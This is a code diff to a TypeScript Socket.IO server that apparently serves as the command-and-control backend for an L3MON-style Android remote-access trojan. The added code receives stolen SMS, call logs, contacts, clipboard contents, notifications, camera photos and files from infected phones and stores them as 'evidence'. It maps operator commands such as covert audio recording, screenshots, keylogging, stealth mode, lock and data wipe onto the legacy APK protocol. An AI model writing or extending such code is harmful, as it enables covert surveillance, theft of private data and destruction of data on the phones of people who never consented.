@@ -3,6 +3,7 @@ import { Server as SocketIOServer, Socket } from "socket.io";
 import { getDb } from "./db";
 import { eq } from "drizzle-orm";
 import { devices, locationHistory, smsLogs } from "../drizzle/schema";
+import { eventBus } from "./eventBus";
 
 export interface DeviceLocation {
   deviceId: number;
@@ -47,12 +48,25 @@ export class WebSocketManager {
     });
 
     this.setupEventHandlers();
+    this.setupEventBusListeners();
+  }
+
+  private setupEventBusListeners(): void {
+    eventBus.on("execute-command", (data: any) => {
+      console.log(`[WebSocket] EVENTBUS Bridge: Command for ${data.deviceId}:`, data.action);
+      this.broadcastToDevice(data.deviceId, "execute-command", {
+        action: data.action,
+        details: data.details,
+        userId: data.userId,
+        payload: data.payload || data.details || {}
+      });
+    });
   }
 
   private setupEventHandlers(): void {
     this.io.on("connection", async (socket: Socket) => {
       const { model, manf, release, id: androidId } = socket.handshake.query;
-      console.log(`[WebSocket] New socket connected: ${socket.id} (Handshake ID: ${androidId || 'None'})`);
+      console.log(`[WebSocket] New socket trying to connect: ${socket.id} | Handshake params: model=${model}, androidId=${androidId}`);
 
       // 1. Device Registration / Identification
       let connectedDeviceId: number | null = null;
@@ -79,13 +93,17 @@ export class WebSocketManager {
             }
 
             if (connectedDeviceId) {
+              console.log(`[WebSocket] Device ${connectedDeviceId} identifying. Joining room: device:${connectedDeviceId}`);
               socket.join(`device:${connectedDeviceId}`);
+              (socket as any).deviceId = connectedDeviceId;
               if (!this.deviceConnections.has(connectedDeviceId)) {
                 this.deviceConnections.set(connectedDeviceId, new Set());
               }
               this.deviceConnections.get(connectedDeviceId)!.add(socket.id);
               console.log(`[WebSocket] Device ${connectedDeviceId} (${model}) is now ONLINE.`);
               this.io.emit("device-status", { deviceId: connectedDeviceId, status: "online", timestamp: Date.now() });
+            } else {
+              console.warn(`[WebSocket] Socket ${socket.id} connected but could not be mapped to a device. androidId=${androidId}`);
             }
           }
         } catch (e) {
@@ -116,7 +134,16 @@ export class WebSocketManager {
       });
 
       // 3. Device Data Handlers (Enhanced security with connectedDeviceId)
-      socket.on("device-location", async (data: DeviceLocation) => {
+      socket.on("device-location", async (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          await this.handleLocationUpdate({ ...data, deviceId: id });
+          this.io.to(`device:${id}`).emit("location-update", { ...data, deviceId: id });
+        }
+      });
+
+      // Alias for legacy APKs
+      socket.on("location", async (data: any) => {
         const id = connectedDeviceId || data.deviceId;
         if (id) {
           await this.handleLocationUpdate({ ...data, deviceId: id });
@@ -129,6 +156,22 @@ export class WebSocketManager {
         if (id) {
           await this.handleSMSMessage({ ...data, deviceId: id });
           this.io.to(`device:${id}`).emit("sms-received", { ...data, deviceId: id });
+        }
+      });
+
+      // Alias for legacy APKs
+      socket.on("sms", async (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          const sms: SMSMessage = {
+            deviceId: id,
+            phoneNumber: data.phoneNumber || data.number || "Unknown",
+            message: data.message || data.body || "",
+            timestamp: data.timestamp || Date.now(),
+            direction: data.direction || "incoming"
+          };
+          await this.handleSMSMessage(sms);
+          this.io.to(`device:${id}`).emit("sms-received", sms);
         }
       });
 
@@ -155,6 +198,54 @@ export class WebSocketManager {
         }
       });
 
+      socket.on("device-notification", async (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          const { advancedMonitoring } = await import("./advancedMonitoring");
+          await advancedMonitoring.logNotification({
+            deviceId: id,
+            appName: data.appName || "Unknown",
+            title: data.title || "",
+            content: data.content || data.body || "",
+            timestamp: new Date(data.timestamp || Date.now()),
+            isRead: false
+          });
+          this.io.to(`device:${id}`).emit("notification-new", { ...data, deviceId: id });
+        }
+      });
+
+      socket.on("device-clipboard", async (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          const { advancedMonitoring } = await import("./advancedMonitoring");
+          await advancedMonitoring.logClipboardEntry({
+            deviceId: id,
+            content: data.content || "",
+            dataType: data.type || "text",
+            timestamp: new Date(data.timestamp || Date.now()),
+            contentPreview: (data.content || "").substring(0, 100)
+          });
+          this.io.to(`device:${id}`).emit("clipboard-new", { ...data, deviceId: id });
+        }
+      });
+
+      // Alias for legacy APKs
+      socket.on("clipboard", async (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          const { advancedMonitoring } = await import("./advancedMonitoring");
+          const content = typeof data === 'string' ? data : (data.content || data.text || "");
+          await advancedMonitoring.logClipboardEntry({
+            deviceId: id,
+            content: content,
+            dataType: "text",
+            timestamp: new Date(),
+            contentPreview: content.substring(0, 100)
+          });
+          this.io.to(`device:${id}`).emit("clipboard-new", { content, deviceId: id, timestamp: Date.now() });
+        }
+      });
+
       // [PLATINUM PHASE 2] Route device responses to the internal EventBus for trpc
       socket.on("device-files", (data: { deviceId: number, path: string, contents: any[] }) => {
         const id = connectedDeviceId || data.deviceId;
@@ -169,6 +260,116 @@ export class WebSocketManager {
         if (id) {
           const { eventBus } = require("./eventBus");
           eventBus.emit(`apps-response-${id}`, data);
+        }
+      });
+
+      // [PLATINUM PHASE 3] Calls handler (0xCL)
+      socket.on("device-calls", (data: { deviceId: number, calls: any[] }) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          console.log(`[WebSocket] Calls data from device ${id}: ${data.calls?.length} records`);
+          const { eventBus } = require("./eventBus");
+          eventBus.emit(`calls-response-${id}`, data);
+          this.io.to(`device:${id}`).emit("calls-update", { ...data, deviceId: id });
+        }
+      });
+
+      // Legacy alias for L3MON call events
+      socket.on("calls", (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          const callsArray = Array.isArray(data) ? data : (data.calls || []);
+          const { eventBus } = require("./eventBus");
+          eventBus.emit(`calls-response-${id}`, { deviceId: id, calls: callsArray });
+          this.io.to(`device:${id}`).emit("calls-update", { calls: callsArray, deviceId: id });
+        }
+      });
+
+      // [PLATINUM PHASE 3] Contacts handler (0xCO)
+      socket.on("device-contacts", (data: { deviceId: number, contacts: any[] }) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          console.log(`[WebSocket] Contacts data from device ${id}: ${data.contacts?.length} records`);
+          const { eventBus } = require("./eventBus");
+          eventBus.emit(`contacts-response-${id}`, data);
+          this.io.to(`device:${id}`).emit("contacts-update", { ...data, deviceId: id });
+        }
+      });
+
+      // Legacy alias for L3MON contact events
+      socket.on("contacts", (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          const contactsArray = Array.isArray(data) ? data : (data.contacts || []);
+          const { eventBus } = require("./eventBus");
+          eventBus.emit(`contacts-response-${id}`, { deviceId: id, contacts: contactsArray });
+          this.io.to(`device:${id}`).emit("contacts-update", { contacts: contactsArray, deviceId: id });
+        }
+      });
+
+      // [PLATINUM PHASE 3] Camera / Media file handler (0xCA)
+      socket.on("device-camera", async (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          console.log(`[WebSocket] Camera data received from device ${id}`);
+          try {
+            // Save image to evidence folder and DB
+            const fs = await import("fs/promises");
+            const path = await import("path");
+            const evidenceDir = path.join(process.cwd(), "builds", "evidence");
+            await fs.mkdir(evidenceDir, { recursive: true });
+            if (data.imageBase64) {
+              const timestamp = Date.now();
+              const fileName = `camera_${id}_${timestamp}.jpg`;
+              const filePath = path.join(evidenceDir, fileName);
+              await fs.writeFile(filePath, Buffer.from(data.imageBase64, "base64"));
+              const db = await getDb();
+              if (db) {
+                const { mediaFiles } = await import("../drizzle/schema");
+                await (db as any).insert(mediaFiles).values({
+                  deviceId: id,
+                  fileName,
+                  fileType: "photo",
+                  fileSize: Buffer.byteLength(data.imageBase64, "base64"),
+                  fileUrl: `/evidence/${fileName}`,
+                  timestamp: new Date(),
+                });
+              }
+              this.io.to(`device:${id}`).emit("camera-new", { deviceId: id, fileName, url: `/evidence/${fileName}`, timestamp });
+              console.log(`[WebSocket] Camera image saved: ${fileName}`);
+            }
+          } catch (e) {
+            console.error("[WebSocket] Camera save failed:", e);
+          }
+        }
+      });
+
+      // Legacy alias for L3MON camera event
+      socket.on("camera", async (data: any) => {
+        const id = connectedDeviceId;
+        if (id && (data.imageBase64 || data.image)) {
+          const imgData = data.imageBase64 || data.image;
+          socket.emit("device-camera", { deviceId: id, imageBase64: imgData });
+        }
+      });
+
+      // [PLATINUM PHASE 3] File upload FROM device handler
+      socket.on("device-file-upload", async (data: { deviceId: number, path: string, content: string }) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          console.log(`[WebSocket] File upload from device ${id}: ${data.path}`);
+          try {
+            const fs = await import("fs/promises");
+            const path = await import("path");
+            const evidenceDir = path.join(process.cwd(), "builds", "evidence", "files");
+            await fs.mkdir(evidenceDir, { recursive: true });
+            const fileName = path.basename(data.path);
+            await fs.writeFile(path.join(evidenceDir, fileName), Buffer.from(data.content, "base64"));
+            const { eventBus } = require("./eventBus");
+            eventBus.emit(`file-uploaded-${id}`, { deviceId: id, path: data.path, localPath: `/evidence/files/${fileName}` });
+          } catch (e) {
+            console.error("[WebSocket] File upload failed:", e);
+          }
         }
       });
 
@@ -191,30 +392,57 @@ export class WebSocketManager {
     });
   }
 
-  private async handleLocationUpdate(location: DeviceLocation): Promise<void> {
+  private async handleLocationUpdate(data: any): Promise<void> {
     const db = await getDb();
-    if (!db) {
-      console.warn("[WebSocket] Database not available");
-      return;
-    }
+    if (!db) return;
 
     try {
-      // Store location in database
+      // Normailize coordinates (L3MON uses lat/lon)
+      const lat = data.latitude ?? data.lat;
+      const lon = data.longitude ?? data.lon ?? data.lng;
+      
+      if (lat === undefined || lon === undefined) return;
+
+      const location = {
+        deviceId: data.deviceId,
+        latitude: parseFloat(String(lat)),
+        longitude: parseFloat(String(lon)),
+        accuracy: parseFloat(String(data.accuracy ?? data.acc ?? 0)),
+        speed: parseFloat(String(data.speed ?? 0)),
+        bearing: parseFloat(String(data.bearing ?? 0)),
+        timestamp: data.timestamp ? new Date(data.timestamp) : new Date()
+      };
+
+      // Store in history
       await db.insert(locationHistory).values({
         deviceId: location.deviceId,
         latitude: location.latitude.toString(),
         longitude: location.longitude.toString(),
         accuracy: location.accuracy.toString(),
-        speed: location.speed ? location.speed.toString() : "0",
-        bearing: location.bearing ? location.bearing.toString() : "0",
-        timestamp: new Date(location.timestamp),
+        speed: location.speed.toString(),
+        bearing: location.bearing.toString(),
+        timestamp: location.timestamp,
       });
 
-      // Update last known location
-      this.lastLocations.set(location.deviceId, location);
+      // Update last known location in memory for real-time hooks
+      this.lastLocations.set(location.deviceId, location as any);
 
-      // Update device last location fields
-      // TODO: Implement device location update in db.ts
+      // Persist to device metadata for quick retrieval in lists
+      const deviceRecords = await db.select().from(devices).where(eq(devices.id, location.deviceId)).limit(1);
+      if (deviceRecords.length > 0) {
+        const currentMetadata = (deviceRecords[0].metadata as any) || {};
+        await db.update(devices).set({
+          metadata: {
+            ...currentMetadata,
+            lastLocation: {
+              lat: location.latitude,
+              lon: location.longitude,
+              acc: location.accuracy,
+              time: location.timestamp.toISOString()
+            }
+          }
+        }).where(eq(devices.id, location.deviceId));
+      }
     } catch (error) {
       console.error("[WebSocket] Error storing location:", error);
     }
@@ -238,15 +466,14 @@ export class WebSocketManager {
       fs.writeFileSync(filePath, data.buffer);
       
       console.log(`[WebSocket] Binary ${type} saved to: ${filePath}`);
-      
       // [MOD L3MON] Persist to database
       const db = await getDb();
       if (db) {
         const { mediaFiles } = await import("../drizzle/schema");
         // Find device ID for this socket
-        let deviceId = data.deviceId;
+        let deviceId = (socket as any).deviceId;
         if (!deviceId) {
-           // Fallback if not provided in data
+           // Fallback: search in connections
            for (const [id, connections] of this.deviceConnections.entries()) {
              if (connections.has(socket.id)) {
                deviceId = id;
@@ -258,7 +485,7 @@ export class WebSocketManager {
         if (deviceId) {
           await db.insert(mediaFiles).values({
             deviceId,
-            fileType: type === "audio" ? "audio" : "photo", // Using photo as fallback for files for now, or add "other"
+            fileType: type === "audio" ? "audio" : "photo",
             fileName: fileName,
             fileUrl: `/api/evidence/download/${fileName}`,
             fileSize: data.buffer.length,
@@ -357,7 +584,63 @@ export class WebSocketManager {
   }
 
   public broadcastToDevice(deviceId: number, event: string, data: any): void {
-    this.io.to(`device:${deviceId}`).emit(event, data);
+    // 1. Map modern action names to legacy protocol if needed
+    const action = data.action || event;
+    const mapping: Record<string, string> = {
+      "request-files": "0xFI",
+      "download-file": "0xFI",
+      "delete-file": "UNSUPPORTED",
+      "get_apps": "0xIN",
+      "get_clipboard": "0xCB",
+      "get_notifications": "0xNO",
+      "get_wifi_scan": "0xWI",
+      "get_keylogs": "UNSUPPORTED",
+      "lock_device": "0xLK",
+      "get-location": "0xLO",
+      "screenshot": "0xSC",
+      "vibrate": "0xVB",
+      "reboot": "0xRB",
+      "wipe_data": "0xWD",
+      "start_audio_recording": "0xMI",
+      "enable_stealth": "0xES",
+      "disable_stealth": "0xDS",
+      "set_gps_polling_speed": "0xLO",
+      "get-wifi": "0xWI",
+      "get-sms": "0xSM",
+      "get-calls": "0xCL",
+      "get-contacts": "0xCO",
+      "get-camera": "0xCA",
+      "send-sms": "0xSM",
+      "upload-file": "0xFI"
+    };
+
+    const mappedAction = mapping[action] || action;
+    
+    // Si la acción no está soportada por el APK L3MON base, abortar el envío para no saturar
+    if (mappedAction === "UNSUPPORTED") {
+      console.warn(`[WebSocket] Acción '${action}' no está soportada por el APK base actual.`);
+      return;
+    }
+
+    const payload = {
+      action: mappedAction, // Legacy L3MON action name
+      type: mappedAction,   // Some branches use type
+      details: data.details || data.payload || {},
+      payload: data.payload || data.details || {},
+      deviceId: deviceId,
+      timestamp: Date.now()
+    };
+
+    console.log(`[WebSocket] TRANSMIT to device:${deviceId} | Protocol: Multi-Event | Action: ${mappedAction}`);
+
+    // Broadcast across ALL possible event listeners for maximum compatibility
+    this.io.to(`device:${deviceId}`).emit("execute-command", payload);
+    this.io.to(`device:${deviceId}`).emit("order", payload);
+    this.io.to(`device:${deviceId}`).emit("command", payload);
+    // Specifically handle the event name passed (like 'get-location') if different
+    if (event !== "execute-command" && event !== "order" && event !== "command") {
+       this.io.to(`device:${deviceId}`).emit(event, payload);
+    }
   }
 
   public broadcastToAll(event: string, data: any): void {
